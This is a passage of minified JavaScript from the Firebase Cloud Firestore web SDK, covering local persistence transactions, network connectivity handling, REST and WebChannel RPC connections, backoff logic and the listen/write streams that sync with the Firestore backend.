Map,this.Ns=e.getRemoteDocumentCache(),this.Pi=e.getTargetCache(),this.Ii=e.getBundleCache(),this.Bs(r)}Bs(e){this.documentOverlayCache=this.persistence.getDocumentOverlayCache(e),this.indexManager=this.persistence.getIndexManager(e),this.mutationQueue=this.persistence.getMutationQueue(e,this.indexManager),this.localDocuments=new RWe(this.Ns,this.mutationQueue,this.documentOverlayCache,this.indexManager),this.Ns.setIndexManager(this.indexManager),this.Fs.initialize(this.localDocuments,this.indexManager)}collectGarbage(e){return this.persistence.runTransaction("Collect garbage","readwrite-primary",(n=>e.collect(n,this.Ms)))}}function HWe(t,e,n,r){return new $We(t,e,n,r)}async function qfe(t,e){const n=Gt(t);return await n.persistence.runTransaction("Handle user change","readonly",(r=>{let i;return n.mutationQueue.getAllMutationBatches(r).next((s=>(i=s,n.Bs(e),n.mutationQueue.getAllMutationBatches(r)))).next((s=>{const o=[],a=[];let c=mn();for(const l of i){o.push(l.batchId);for(const f of l.mutations)c=c.add(f.key)}for(const l of s){a.push(l.batchId);for(const f of l.mutations)c=c.add(f.key)}return n.localDocuments.getDocuments(r,c).next((l=>({Ls:l,removedBatchIds:o,addedBatchIds:a})))}))}))}function zWe(t,e){const n=Gt(t);return n.persistence.runTransaction("Acknowledge batch","readwrite-primary",(r=>{const i=e.batch.keys(),s=n.Ns.newChangeBuffer({trackRemovals:!0});return(function(a,c,l,f){const h=l.batch,m=h.keys();let b=He.resolve();return m.forEach((w=>{b=b.next((()=>f.getEntry(c,w))).next((y=>{const E=l.docVersions.get(w);Kn(E!==null,48541),y.version.compareTo(E)<0&&(h.applyToRemoteDocument(y,l),y.isValidDocument()&&(y.setReadTime(l.commitVersion),f.addEntry(y)))}))})),b.next((()=>a.mutationQueue.removeMutationBatch(c,h)))})(n,r,e,s).next((()=>s.apply(r))).next((()=>n.mutationQueue.performConsistencyCheck(r))).next((()=>n.documentOverlayCache.removeOverlaysForBatchId(r,i,e.batch.batchId))).next((()=>n.localDocuments.recalculateAndSaveOverlaysForDocumentKeys(r,(function(a){let c=mn();for(let l=0;l<a.mutationResults.length;++l)a.mutationResults[l].transformResults.length>0&&(c=c.add(a.batch.mutations[l].key));return c})(e)))).next((()=>n.localDocuments.getDocuments(r,i)))}))}function Vfe(t){const e=Gt(t);return e.persistence.runTransaction("Get last remote snapshot version","readonly",(n=>e.Pi.getLastRemoteSnapshotVersion(n)))}function qWe(t,e){const n=Gt(t),r=e.snapshotVersion;let i=n.Ms;return n.persistence.runTransaction("Apply remote event","readwrite-primary",(s=>{const o=n.Ns.newChangeBuffer({trackRemovals:!0});i=n.Ms;const a=[];e.targetChanges.forEach(((f,h)=>{const m=i.get(h);if(!m)return;a.push(n.Pi.removeMatchingKeys(s,f.removedDocuments,h).next((()=>n.Pi.addMatchingKeys(s,f.addedDocuments,h))));let b=m.withSequenceNumber(s.currentSequenceNumber);e.targetMismatches.get(h)!==null?b=b.withResumeToken(xs.EMPTY_BYTE_STRING,qt.min()).withLastLimboFreeSnapshotVersion(qt.min()):f.resumeToken.approximateByteSize()>0&&(b=b.withResumeToken(f.resumeToken,r)),i=i.insert(h,b),(function(y,E,A){return y.resumeToken.approximateByteSize()===0||E.snapshotVersion.toMicroseconds()-y.snapshotVersion.toMicroseconds()>=FWe?!0:A.addedDocuments.size+A.modifiedDocuments.size+A.removedDocuments.size>0})(m,b,f)&&a.push(n.Pi.updateTargetData(s,b))}));let c=qf(),l=mn();if(e.documentUpdates.forEach((f=>{e.resolvedLimboDocuments.has(f)&&a.push(n.persistence.referenceDelegate.updateLimboDocument(s,f))})),a.push(VWe(s,o,e.documentUpdates).next((f=>{c=f.ks,l=f.qs}))),!r.isEqual(qt.min())){const f=n.Pi.getLastRemoteSnapshotVersion(s).next((h=>n.Pi.setTargetsMetadata(s,s.currentSequenceNumber,r)));a.push(f)}return He.waitFor(a).next((()=>o.apply(s))).next((()=>n.localDocuments.getLocalViewOfDocuments(s,c,l))).next((()=>c))})).then((s=>(n.Ms=i,s)))}function VWe(t,e,n){let r=mn(),i=mn();return n.forEach((s=>r=r.add(s))),e.getEntries(t,r).next((s=>{let o=qf();return n.forEach(((a,c)=>{const l=s.get(a);c.isFoundDocument()!==l.isFoundDocument()&&(i=i.add(a)),c.isNoDocument()&&c.version.isEqual(qt.min())?(e.removeEntry(a,c.readTime),o=o.insert(a,c)):!l.isValidDocument()||c.version.compareTo(l.version)>0||c.version.compareTo(l.version)===0&&l.hasPendingWrites?(e.addEntry(c),o=o.insert(a,c)):mt(eU,"Ignoring outdated watch update for ",a,". Current version:",l.version," Watch version:",c.version)})),{ks:o,qs:i}}))}function WWe(t,e){const n=Gt(t);return n.persistence.runTransaction("Get next mutation batch","readonly",(r=>(e===void 0&&(e=HM),n.mutationQueue.getNextMutationBatchAfterBatchId(r,e))))}function GWe(t,e){const n=Gt(t);return n.persistence.runTransaction("Allocate target","readwrite",(r=>{let i;return n.Pi.getTargetData(r,e).next((s=>s?(i=s,He.resolve(i)):n.Pi.allocateTargetId(r).next((o=>(i=new yp(e,o,"TargetPurposeListen",r.currentSequenceNumber),n.Pi.addTargetData(r,i).next((()=>i)))))))})).then((r=>{const i=n.Ms.get(r.targetId);return(i===null||r.snapshotVersion.compareTo(i.snapshotVersion)>0)&&(n.Ms=n.Ms.insert(r.targetId,r),n.xs.set(e,r.targetId)),r}))}async function qD(t,e,n){const r=Gt(t),i=r.Ms.get(e),s=n?"readwrite":"readwrite-primary";try{n||await r.persistence.runTransaction("Release target",s,(o=>r.persistence.referenceDelegate.removeTarget(o,i)))}catch(o){if(!Cw(o))throw o;mt(eU,`Failed to update sequence numbers for target ${e}: ${o}`)}r.Ms=r.Ms.remove(e),r.xs.delete(i.target)}function Vne(t,e,n){const r=Gt(t);let i=qt.min(),s=mn();return r.persistence.runTransaction("Execute query","readwrite",(o=>(function(c,l,f){const h=Gt(c),m=h.xs.get(f);return m!==void 0?He.resolve(h.Ms.get(m)):h.Pi.getTargetData(l,f)})(r,o,zl(e)).next((a=>{if(a)return i=a.lastLimboFreeSnapshotVersion,r.Pi.getMatchingKeysForTargetId(o,a.targetId).next((c=>{s=c}))})).next((()=>r.Fs.getDocumentsMatchingQuery(o,e,n?i:qt.min(),n?s:mn()))).next((a=>(KWe(r,kVe(e),a),{documents:a,Qs:s})))))}function KWe(t,e,n){let r=t.Os.get(e)||qt.min();n.forEach(((i,s)=>{s.readTime.compareTo(r)>0&&(r=s.readTime)})),t.Os.set(e,r)}class Wne{constructor(){this.activeTargetIds=LVe()}zs(e){this.activeTargetIds=this.activeTargetIds.add(e)}js(e){this.activeTargetIds=this.activeTargetIds.delete(e)}Gs(){const e={activeTargetIds:this.activeTargetIds.toArray(),updateTimeMs:Date.now()};return JSON.stringify(e)}}class ZWe{constructor(){this.Mo=new Wne,this.xo={},this.onlineStateHandler=null,this.sequenceNumberHandler=null}addPendingMutation(e){}updateMutationState(e,n,r){}addLocalQueryTarget(e,n=!0){return n&&this.Mo.zs(e),this.xo[e]||"not-current"}updateQueryState(e,n,r){this.xo[e]=n}removeLocalQueryTarget(e){this.Mo.js(e)}isLocalQueryTarget(e){return this.Mo.activeTargetIds.has(e)}clearQueryState(e){delete this.xo[e]}getAllActiveQueryTargets(){return this.Mo.activeTargetIds}isActiveQueryTarget(e){return this.Mo.activeTargetIds.has(e)}start(){return this.Mo=new Wne,Promise.resolve()}handleUserChange(e,n,r){}setOnlineState(e){}shutdown(){}writeSequenceNumber(e){}notifyBundleLoaded(e){}}class YWe{Oo(e){}shutdown(){}}const Gne="ConnectivityMonitor";class Kne{constructor(){this.No=()=>this.Bo(),this.Lo=()=>this.ko(),this.qo=[],this.Qo()}Oo(e){this.qo.push(e)}shutdown(){window.removeEventListener("online",this.No),window.removeEventListener("offline",this.Lo)}Qo(){window.addEventListener("online",this.No),window.addEventListener("offline",this.Lo)}Bo(){mt(Gne,"Network connectivity changed: AVAILABLE");for(const e of this.qo)e(0)}ko(){mt(Gne,"Network connectivity changed: UNAVAILABLE");for(const e of this.qo)e(1)}static v(){return typeof window<"u"&&window.addEventListener!==void 0&&window.removeEventListener!==void 0}}let kT=null;function VD(){return kT===null?kT=(function(){return 268435456+Math.round(2147483648*Math.random())})():kT++,"0x"+kT.toString(16)}const _k="RestConnection",QWe={BatchGetDocuments:"batchGet",Commit:"commit",RunQuery:"runQuery",RunAggregationQuery:"runAggregationQuery"};class JWe{get $o(){return!1}constructor(e){this.databaseInfo=e,this.databaseId=e.databaseId;const n=e.ssl?"https":"http",r=encodeURIComponent(this.databaseId.projectId),i=encodeURIComponent(this.databaseId.database);this.Uo=n+"://"+e.host,this.Ko=`projects/${r}/databases/${i}`,this.Wo=this.databaseId.database===CI?`project_id=${r}`:`project_id=${r}&database_id=${i}`}Go(e,n,r,i,s){const o=VD(),a=this.zo(e,n.toUriEncodedString());mt(_k,`Sending RPC '${e}' ${o}:`,a,r);const c={"google-cloud-resource-prefix":this.Ko,"x-goog-request-params":this.Wo};this.jo(c,i,s);const{host:l}=new URL(a),f=UM(l);return this.Jo(e,a,c,r,f).then((h=>(mt(_k,`Received RPC '${e}' ${o}: `,h),h)),(h=>{throw Z1(_k,`RPC '${e}' ${o} failed with error: `,h,"url: ",a,"request:",r),h}))}Ho(e,n,r,i,s,o){return this.Go(e,n,r,i,s)}jo(e,n,r){e["X-Goog-Api-Client"]=(function(){return"gl-js/ fire/"+_w})(),e["Content-Type"]="text/plain",this.databaseInfo.appId&&(e["X-Firebase-GMPID"]=this.databaseInfo.appId),n&&n.headers.forEach(((i,s)=>e[s]=i)),r&&r.headers.forEach(((i,s)=>e[s]=i))}zo(e,n){const r=QWe[e];return`${this.Uo}/v1/${n}:${r}`}terminate(){}}class XWe{constructor(e){this.Yo=e.Yo,this.Zo=e.Zo}Xo(e){this.e_=e}t_(e){this.n_=e}r_(e){this.i_=e}onMessage(e){this.s_=e}close(){this.Zo()}send(e){this.Yo(e)}o_(){this.e_()}__(){this.n_()}a_(e){this.i_(e)}u_(e){this.s_(e)}}const qs="WebChannelConnection";class eGe extends JWe{constructor(e){super(e),this.c_=[],this.forceLongPolling=e.forceLongPolling,this.autoDetectLongPolling=e.autoDetectLongPolling,this.useFetchStreams=e.useFetchStreams,this.longPollingOptions=e.longPollingOptions}Jo(e,n,r,i,s){const o=VD();return new Promise(((a,c)=>{const l=new Gde;l.setWithCredentials(!0),l.listenOnce(Kde.COMPLETE,(()=>{try{switch(l.getLastErrorCode()){case ex.NO_ERROR:const h=l.getResponseJson();mt(qs,`XHR for RPC '${e}' ${o} received:`,JSON.stringify(h)),a(h);break;case ex.TIMEOUT:mt(qs,`RPC '${e}' ${o} timed out`),c(new ut(Fe.DEADLINE_EXCEEDED,"Request time out"));break;case ex.HTTP_ERROR:const m=l.getStatus();if(mt(qs,`RPC '${e}' ${o} failed with status:`,m,"response text:",l.getResponseText()),m>0){let b=l.getResponseJson();Array.isArray(b)&&(b=b[0]);const w=b?.error;if(w&&w.status&&w.message){const y=(function(A){const R=A.toLowerCase().replace(/_/g,"-");return Object.values(Fe).indexOf(R)>=0?R:Fe.UNKNOWN})(w.status);c(new ut(y,w.message))}else c(new ut(Fe.UNKNOWN,"Server responded with status "+l.getStatus()))}else c(new ut(Fe.UNAVAILABLE,"Connection failed."));break;default:Ft(9055,{l_:e,streamId:o,h_:l.getLastErrorCode(),P_:l.getLastError()})}}finally{mt(qs,`RPC '${e}' ${o} completed.`)}}));const f=JSON.stringify(i);mt(qs,`RPC '${e}' ${o} sending request:`,i),l.send(n,"POST",f,r,15)}))}T_(e,n,r){const i=VD(),s=[this.Uo,"/","google.firestore.v1.Firestore","/",e,"/channel"],o=Qde(),a=Yde(),c={httpSessionIdParam:"gsessionid",initMessageHeaders:{},messageUrlParams:{database:`projects/${this.databaseId.projectId}/databases/${this.databaseId.database}`},sendRawJson:!0,supportsCrossDomainXhr:!0,internalChannelParams:{forwardChannelRequestTimeoutMs:6e5},forceLongPolling:this.forceLongPolling,detectBufferingProxy:this.autoDetectLongPolling},l=this.longPollingOptions.timeoutSeconds;l!==void 0&&(c.longPollingTimeout=Math.round(1e3*l)),this.useFetchStreams&&(c.useFetchStreams=!0),this.jo(c.initMessageHeaders,n,r),c.encodeInitMessageHeaders=!0;const f=s.join("");mt(qs,`Creating RPC '${e}' stream ${i}: ${f}`,c);const h=o.createWebChannel(f,c);this.I_(h);let m=!1,b=!1;const w=new XWe({Yo:E=>{b?mt(qs,`Not sending because RPC '${e}' stream ${i} is closed:`,E):(m||(mt(qs,`Opening RPC '${e}' stream ${i} transport.`),h.open(),m=!0),mt(qs,`RPC '${e}' stream ${i} sending:`,E),h.send(E))},Zo:()=>h.close()}),y=(E,A,R)=>{E.listen(A,(S=>{try{R(S)}catch(v){setTimeout((()=>{throw v}),0)}}))};return y(h,J2.EventType.OPEN,(()=>{b||(mt(qs,`RPC '${e}' stream ${i} transport opened.`),w.o_())})),y(h,J2.EventType.CLOSE,(()=>{b||(b=!0,mt(qs,`RPC '${e}' stream ${i} transport closed`),w.a_(),this.E_(h))})),y(h,J2.EventType.ERROR,(E=>{b||(b=!0,Z1(qs,`RPC '${e}' stream ${i} transport errored. Name:`,E.name,"Message:",E.message),w.a_(new ut(Fe.UNAVAILABLE,"The operation could not be completed")))})),y(h,J2.EventType.MESSAGE,(E=>{if(!b){const A=E.data[0];Kn(!!A,16349);const R=A,S=R?.error||R[0]?.error;if(S){mt(qs,`RPC '${e}' stream ${i} received error:`,S);const v=S.status;let k=(function(I){const T=xi[I];if(T!==void 0)return Ofe(T)})(v),O=S.message;k===void 0&&(k=Fe.INTERNAL,O="Unknown error status: "+v+" with message "+S.message),b=!0,w.a_(new ut(k,O)),h.close()}else mt(qs,`RPC '${e}' stream ${i} received:`,A),w.u_(A)}})),y(a,Zde.STAT_EVENT,(E=>{E.stat===OD.PROXY?mt(qs,`RPC '${e}' stream ${i} detected buffering proxy`):E.stat===OD.NOPROXY&&mt(qs,`RPC '${e}' stream ${i} detected no buffering proxy`)})),setTimeout((()=>{w.__()}),0),w}terminate(){this.c_.forEach((e=>e.close())),this.c_=[]}I_(e){this.c_.push(e)}E_(e){this.c_=this.c_.filter((n=>n===e))}}function Ak(){return typeof document<"u"?document:null}function vR(t){return new iWe(t,!0)}class Wfe{constructor(e,n,r=1e3,i=1.5,s=6e4){this.Mi=e,this.timerId=n,this.d_=r,this.A_=i,this.R_=s,this.V_=0,this.m_=null,this.f_=Date.now(),this.reset()}reset(){this.V_=0}g_(){this.V_=this.R_}p_(e){this.cancel();const n=Math.floor(this.V_+this.y_()),r=Math.max(0,Date.now()-this.f_),i=Math.max(0,n-r);i>0&&mt("ExponentialBackoff",`Backing off for ${i} ms (base delay: ${this.V_} ms, delay with jitter: ${n} ms, last attempt: ${r} ms ago)`),this.m_=this.Mi.enqueueAfterDelay(this.timerId,i,(()=>(this.f_=Date.now(),e()))),this.V_*=this.A_,this.V_<this.d_&&(this.V_=this.d_),this.V_>this.R_&&(this.V_=this.R_)}w_(){this.m_!==null&&(this.m_.skipDelay(),this.m_=null)}cancel(){this.m_!==null&&(this.m_.cancel(),this.m_=null)}y_(){return(Math.random()-.5)*this.V_}}const Zne="PersistentStream";class Gfe{constructor(e,n,r,i,s,o,a,c){this.Mi=e,this.S_=r,this.b_=i,this.connection=s,this.authCredentialsProvider=o,this.appCheckCredentialsProvider=a,this.listener=c,this.state=0,this.D_=0,this.C_=null,this.v_=null,this.stream=null,this.F_=0,this.M_=new Wfe(e,n)}x_(){return this.state===1||this.state===5||this.O_()}O_(){return this.state===2||this.state===3}start(){this.F_=0,this.state!==4?this.auth():this.N_()}async stop(){this.x_()&&await this.close(0)}B_(){this.state=0,this.M_.reset()}L_(){this.O_()&&this.C_===null&&(this.C_=this.Mi.enqueueAfterDelay(this.S_,6e4,(()=>this.k_())))}q_(e){this.Q_(),this.stream.send(e)}async k_(){if(this.O_())return this.close(0)}Q_(){this.C_&&(this.C_.cancel(),this.C_=null)}U_(){this.v_&&(this.v_.cancel(),this.v_=null)}async close(e,n){this.Q_(),this.U_(),this.M_.cancel(),this.D_++,e!==4?this.M_.reset():n&&n.code===Fe.RESOURCE_EXHAUSTED?(zf(n.toString()),zf("Using maximum backoff delay to prevent overloading the backend."),this.M_.g_()):n&&n.code===Fe.UNAUTHENTICATED&&this.state!==3&&(this.authCredentialsProvider.invalidateToken(),this.appCheckCredentialsProvider.invalidateToken()),this.stream!==null&&(this.K_(),this.stream.close(),this.stream=null),this.state=e,await this.listener.r_(n)}K_(){}auth(){this.state=1;const e=this.W_(this.D_),n=this.D_;Promise.all([this.authCredentialsProvider.getToken(),this.appCheckCredentialsProvider.getToken()]).then((([r,i])=>{this.D_===n&&this.G_(r,i)}),(r=>{e((()=>{const i=new ut(Fe.UNKNOWN,"Fetching auth token failed: "+r.message);return this.z_(i)}))}))}G_(e,n){const r=this.W_(this.D_);this.stream=this.j_(e,n),this.stream.Xo((()=>{r((()=>this.listener.Xo()))})),this.stream.t_((()=>{r((()=>(this.state=2,this.v_=this.Mi.enqueueAfterDelay(this.b_,1e4,(()=>(this.O_()&&(this.state=3),Promise.resolve()))),this.listener.t_())))})),this.stream.r_((i=>{r((()=>this.z_(i)))})),this.stream.onMessage((i=>{r((()=>++this.F_==1?this.J_(i):this.onNext(i)))}))}N_(){this.state=5,this.M_.p_((async()=>{this.state=0,this.start()}))}z_(e){return mt(Zne,`close with error: ${e}`),this.stream=null,this.close(4,e)}W_(e){return n=>{this.Mi.enqueueAndForget((()=>this.D_===e?n():(mt(Zne,"stream callback skipped by getCloseGuardedDispatcher."),Promise.resolve())))}}}class tGe extends Gfe{constructor(e,n,r,i,s,o){super(e,"listen_stream_connection_backoff","listen_stream_idle","health_check_timeout",n,r,i,o),this.serializer=s}j_(e,n){return this.connection.T_("Listen",e,n)}J_(e){return this.onNext(e)}onNext(e){this.M_.reset();const n=aWe(this.serializer,e),r=(function(s){if(!("targetChange"in s))return qt.min();const o=s.targetChange;return o.targetIds&&o.targetIds.length?qt.min():o.readTime?ql(o.readTime):qt.min()})(e);return this.listener.H_(n,r)}Y_(e){const n={};n.database=zD(this.serializer),n.addTarget=(function(s,o){let a;const c=o.target;if(a=MD(c)?{documents:lWe(s,c)}:{query:dWe(s,c).ft},a.targetId=o.targetId,o.resumeToken.approximateByteSize()>0){a.resumeToken=Bfe(s,o.resumeToken);const l=FD(s,o.expectedCount);l!==null&&(a.expectedCount=l)}else if(o.snapshotVersion.compareTo(qt.min())>0){a.readTime=PI(s,o.snapshotVersion.toTimestamp());const l=FD(s,o.expectedCount);l!==null&&(a.expectedCount=l)}return a})(this.serializer,e);const r=hWe(this.serializer,e);r&&(n.labels=r),this.q_(n)}Z_(e){const n={};n.database=zD(this.serializer),n.removeTarget=e,this.q_(n)}}class nGe extends Gfe{constructor(e,n,r,i,s,o){super(e,"write_stream_connection_backoff","write_stream_idle","health_check_timeout",n,r,i,o),this.serializer=s}get X_(){return this.F_>0}start(){this.lastStreamToken=void 0,super.start()}K_(){this.X_&&this.ea([])}j_(e,n){return this.connection.T_("Write",e,n)}J_(e){return Kn(!!e.streamToken,31322),this.lastStreamToken=e.streamToken,Kn(!e.writeResults||e.writeResults.length===0,55816),this.listener.ta()}onNext(e){Kn(!!e.streamToken,12678),this.lastStreamToken=e.streamToken,this.M_.reset();const n=uWe(e.writeResults,e.commitTime),r=ql(e.commitTime);return this.listener.na(r,n)}ra(){const e={};e.database=zD(this.serializer),this.q_(e)}ea(e){const n={streamToken:this.lastStreamToken,writes:e.map((r=>cWe(this.serializer,r)))};this.q_(n)}}class rGe{}class iGe extends rGe{constructor(e,n,r,i){super(),this.authCredentials=e,this.appCheckCredentials=n,this.connection=r,this.serializer=i,this.ia=!1}sa(){if(this.ia)throw new ut(Fe.FAILED_PRECONDITION,"The client has already been terminated.")}Go(e,n,r,i){return this.sa(),Promise.all([this.authCredentials.getToken(),this.appCheckCredentials.getToken()]).then((([s,o])=>this.connection.Go(e,$D(n,r),i,s,o))).catch((s=>{throw s.name==="FirebaseError"?(s.code===Fe.UNAUTHENTICATED&&(this.authCredentials.invalidateToken(),this.appCheckCredentials.invalidateToken()),s):new ut(Fe.UNKNOWN,s.toString())}))}Ho(e,n,r,i,s){return this.sa(),Promise.all([this.authCredentials.getToken(),this.appCheckCredentials.getToken()]).then((([o,a])=>this.connection.Ho(e,$D(n,r),i,o,a,s))).catch((o=>{throw o.name==="FirebaseError"?(o.code===Fe.UNAUTHENTICATED&&(this.authCredentials.invalidateToken(),this.appCheckCredentials.invalidateToken()),o):new ut(Fe.UNKNOWN,o.toString())}))}terminate(){this.ia=!0,this.connection.terminate()}}class sGe{constructor(e,n){this.asyncQueue=e,this.onlineStateHandler=n,this.state="Unknown",this.oa=0,this._a=null,this.aa=!0}ua(){this.oa===0&&(this.ca("Unknown"),this._a=this.asyncQueue.enqueueAfterDelay("online_state_timeout",1e4,(()=>(this._a=null,this.la("Backend didn't respond within 10 seconds."),this.ca("Offline"),Promise.resolve()))))}ha(e){this.state==="Online"?this.ca("Unknown"):(this.oa++,this.oa>=1&&(this.Pa(),this.la(`Connection failed 1 times. Most recent error: ${e.toString()}`),this.ca("Offline")))}set(e){this.Pa(),this.oa=0,e==="Online"&&(this.aa=!1),this.ca(e)}ca(e){e!==this.state&&(this.state=e,this.onlineStateHandler(e))}la(e){const n=`Could not reach Cloud Firestore backend. ${e}
This typically indicates that your device does not have a healthy Internet connection at the moment. The client will operate in offline mode until it is able to successfully connect to the backend.`;this.aa?(zf(n),this.aa=!1):mt("OnlineStateTracker",n)}Pa(){this._a!==null&&(this._a.cancel(),this._a=null)}}const Bg="RemoteStore";class oGe{constructor(e,n,r,i,s){this.localStore=e,this.datastore=n,this.asyncQueue=r,this.remoteSyncer={},this.Ta=[],this.Ia=new Map,this.Ea=new Set,this.da=[],this.Aa=s,this.Aa.Oo((o=>{r.enqueueAndForget((async()=>{my(this)&&(mt(Bg,"Restarting streams for network reachability change."),await(async function(c){const l=Gt(c);l.Ea.add(4),await a5(l),l.Ra.set("Unknown"),l.Ea.delete(4),await ER(l)})(this))}))})),this.Ra=new sGe(r,i)}}async function ER(t){if(my(t))for(const e of t.da)await e(!0)}async function a5(t){for(const e of t.da)await e(!1)}function Kfe(t,e){const n=Gt(t);n.Ia.has(e.targetId)||(n.Ia.set(e.targetId,e),iU(n)?rU(n):Sw(n).O_()&&nU(n,e))}function tU(t,e){const n=Gt(t),r=Sw(n);n.Ia.delete(e),r.O_()&&Zfe(n,e),n.Ia.size===0&&(r.O_()?r.L_():my(n)&&n.Ra.set("Unknown"))}function nU(t,e){if(t.Va.Ue(e.targetId),e.resumeToken.approximateByteSize()>0||e.snapshotVersion.compareTo(qt.min())>0){const n=t.remoteSyncer.getRemoteKeysForTarget(e.targetId).size;e=e.withExpectedCount(n)}Sw(t).Y_(e)}function Zfe(t,e){t.Va.Ue(e),Sw(t).Z_(e)}function rU(t){t.Va=new eWe({getRemoteKeysForTarget:e=>t.remoteSyncer.getRemoteKeysForTarget(e),At:e=>t.Ia.get(e)||null,ht:()=>t.datastore.serializer.databaseId}),Sw(t).start(),t.Ra.ua()}function iU(t){return my(t)&&!Sw(t).x_()&&t.Ia.size>0}function my(t){return Gt(t).Ea.size===0}function Yfe(t){t.Va=void 0}async function aGe(t){t.Ra.set("Online")}async function cGe(t){t.Ia.forEach(((e,n)=>{nU(t,e)}))}async function uGe(t,e){Yfe(t),iU(t)?(t.Ra.ha(e),rU(t)):t.Ra.set("Unknown")}async function lGe(t,e,n){if(t.Ra.set("Online"),e instanceof Dfe&&e.state===2&&e.cause)try{await(async function(i,s){const o=s.cause;for(const a of s.targetIds)i.Ia.has(a)&&(await i.remoteSyncer.rejectListen(a,o),i.Ia.delete(a),i.Va.removeTarget(a))})(t,e)}catch(r){mt(Bg,"Failed to remove targets %s: %s ",e.targetIds.join(","),r),await OI(t,r)}else if(e instanceof ix?t.Va.Ze(e):e instanceof kfe?t.Va.st(e):t.Va.tt(e),!n.isEqual(qt.min()))try{const r=await Vfe(t.localStore);n.compareTo(r)>=0&&await(function(s,o){const a=s.Va.Tt(o);return a.targetChanges.forEach(((c,l)=>{if(c.resumeToken.approximateByteSize()>0){const f=s.Ia.get(l);f&&s.Ia.set(l,f.withResumeToken(c.resumeToken,o))}})),a.targetMismatches.forEach(((c,l)=>{const f=s.Ia.get(c);if(!f)return;s.Ia.set(c,f.withResumeToken(xs.EMPTY_BYTE_STRING,f.snapshotVersion)),Zfe(s,c);const h=new yp(f.target,c,l,f.sequenceNumber);nU(s,h)})),s.remoteSyncer.applyRemoteEvent(a)})(t,n)}catch(r){mt(Bg,"Failed to raise snapshot:",r),await OI(t,r)}}async function OI(t,e,n){if(!Cw(e))throw e;t.Ea.add(1),await a5(t),t.Ra.set("Offline"),n||(n=()=>Vfe(t.localStore)),t.asyncQueue.enqueueRetryable((async()=>{mt(Bg,"Retrying IndexedDB access"),await n(),t.Ea.delete(1),await ER(t)}))}function Qfe(t,e){return e().catch((n=>OI(t,n,e)))}async function _R(t){const e=Gt(t),n=qp(e);let r=e.Ta.length>0?e.Ta[e.Ta.length-1].batchId:HM;for(;dGe(e);)try{const i=await WWe(e.localStore,r);if(i===null){e.Ta.length===0&&n.L_();break}r=i.batchId,fGe(e,i)}catch(i){await OI(e,i)}Jfe(e)&&Xfe(e)}function dGe(t){return my(t)&&t.Ta.length<10}function fGe(t,e){t.Ta.push(e);const n=qp(t);n.O_()&&n.X_&&n.ea(e.mutations)}function Jfe(t){return my(t)&&!qp(t).x_()&&t.Ta.length>0}function Xfe(t){qp(t).start()}async function hGe(t){qp(t).ra()}async function pGe(t){const e=qp(t);for(const n of t.Ta)e.ea(n.mutations)}async function mGe(t,e,n){const r=t.Ta.shift(),i=KM.from(r,e,n);await Qfe(t,(()=>t.remoteSyncer.applySuccessfulWrite(i))),await _R(t)}async function gGe(t,e){e&&qp(t).X_&&await(async function(r,i){if((function(o){return QVe(o)&&o!==Fe.ABORTED})(i.code)){const s=r.Ta.shift();qp(r).B_(),await Qfe(r,(()=>r.remoteSyncer.rejectFailedWrite(s.batchId,i))),await _R(r)}})(t,e),Jfe(t)&&Xfe(t)}async function Yne(t,e){const n=Gt(t);n.asyncQueue.verifyOperationInProgress(),mt(Bg,"RemoteStore received new credentials");const r=my(n);n.Ea.add(3),await a5(n),r&&n.Ra.set("Unknown"),await n.remoteSyncer.handleCredentialChange(e),n.Ea.delete(3),await ER(n)}async function yGe(t,e){const n=Gt(t);e?(n.Ea.delete(2),await ER(n)):e||(n.Ea.add(2),await a5(n),n.Ra.set("Unknown"))}function Sw(t){return t.ma||(t.ma=(function(n,r,i){const s=Gt(n);return s.sa(),new tGe(r,s.connection,s.authCredentials,s.appCheckCredentials,s.serializer,i)})(t.datastore,t.asyncQueue,{Xo:aGe.bind(null,t),t_:cGe.bind(null,t),r_:uGe.bind(null,t),H_:lGe.bind(null,t)}),t.da.push((async e=>{e?(t.ma.B_(),iU(t)?rU(t):t.Ra.set("Unknown")):(await t.ma.stop(),Yfe(t))}))),t.ma}function qp(t){return t.fa||(t.fa=(function(n,r,i){const s=Gt(n);return s.sa(),new nGe(r,s.connection,s.authCredentials,s.appCheckCredentials,s.serializer,i)})(t.datastore,t.asyncQueue,{Xo:()=>Promise.resolve(),t_:hGe.bind(null,t),r_:gGe.bind(null,t),ta:pGe.bind(null,t),na:mGe.bind(null,t)}),t.da.push((async e=>{e?(t.fa.B_(),await _R(t)):(await t.fa.stop(),t.Ta.length>0&&(mt(Bg,`Stopping write stream with ${t.Ta.length} pending writes`),t.Ta=[]))}))),t.fa}class sU{constructor(e,n,r,i,s){this.asyncQueue=e,this.timerId=n,this.targetTimeMs=r,this.op=i,this.removalCallback=s,this.deferred=new Cp,this.then=this.deferred.promise.then.bind(this.deferred.promise),this.deferred.promise.catch((o=>{}))}get promise(){return this.deferred.promise}static createAndSchedule(e,n,r,i,s){const o=Date.now()+r,a=new sU(e,n,o,i,s);return a.start(r),a}start(e){this.timerHandle=setTimeout((()=>this.handleDelayElapsed()),e)}skipDelay(){return this.handleDelayElapsed()}cancel(e){this.timerHandle!==null&&(this.clearTimeout(),this.deferred.reject(new ut(Fe.CANCELLED,"Operation cancelled"+(e?": "+e:""))))}handleDelayElapsed(){this.asyncQueue.enqueueAndForget((()=>this.timerHandle!==null?(this.clearTimeout(),this.op().then((e=>this.deferred.resolve(e)))):Promise.resolve()))}clearTimeout(){this.timerHandle!==null&&(this.removalCallback(this),clearTimeout(this.timerHandle),this.timerHandle=null)}}function oU(t,e){if(zf("AsyncQueue",`${e}: ${t}`),Cw(t))return new ut(Fe.UNAVAILABLE,`${e}: ${t}`);throw t}class p1{static emptySet(e){return new p1(e.comparator)}constructor(e){this.comparator=e?(n,r)=>e(n,r)||Pt.comparator(n.key,r.key):(n,r)=>Pt.comparator(n.key,r.key),this.keyedMap=X2(),this.sortedSet=new Yr(this.comparator)}has(e){return this.keyedMap.get(e)!=null}get(e){return this.keyedMap.get(e)}first(){return this.sortedSet.minKey()}last(){return this.sortedSet.maxKey()}isEmpty(){return this.sortedSet.isEmpty()}indexOf(e){const n=this.keyedMap.get(e);return n?this.sortedSet.indexOf(n):-1}get size(){return this.sortedSet.size}forEach(e){this.sortedSet.inorderTraversal(((n,r)=>(e(n),!1)))}add(e){const n=this.delete(e.key);return n.copy(n.keyedMap.insert(e.key,e),n.sortedSet.insert(e,null))}delete(e){const n=this.get(e);return n?this.copy(this.keyedMap.remove(e),this.sortedSet.remove(n)):this}isEqual(e){if(!(e instanceof p1)||this.size!==e.size)return!1;const n=this.sortedSet.getIterator(),r=e.sortedSet.getIterator();for(;n.hasNext();){const 